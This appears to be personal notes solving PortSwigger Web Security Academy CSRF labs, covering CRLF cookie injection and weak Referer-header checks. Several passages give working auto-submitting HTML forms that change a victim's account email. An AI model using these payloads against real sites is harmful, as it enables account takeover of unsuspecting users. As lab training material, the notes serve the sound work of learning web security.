...
- solution:
  ...
  I then had to find out that when searching the response set the search string as a cookie, I could then escape out of this string using the URL encoded carriage return and newline \n symbols. This then set the csrfKey cookie, I could then craft a payload that loaded that page with an image element (setting the cookie) but then submitted a form on error:
  #+begin_src html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
...
- solution:
  this lab validated the email with a referer header, it didn't validate it if it wasn't there, so I wrote a payload that sent the request without the referer:
  ...
  <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
      <form action="https://0a9b001803debc4d80de038c0092000a.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="tesfdsffdft&#64;dontwannacry&#46;com" />
        <input type="submit" value="Submit request" />
      </form>
      <script>
        history.pushState('', '', '/');
...
- solution:
  this one was a bit harder, I had to see that csrf was possible, the site used the referer header to validate; however, it just checked to see if the domain was in the referer, it didn't validate the whole string.
  So I could use attacker.co.uk?csrf=laburl.co.uk and it would accept it.
  I then crafted this exploit:
  ...
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a710093033835a280ba038700e200b7.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="laddfdfsd&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/?0a710093033835a280ba038700e200b7.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
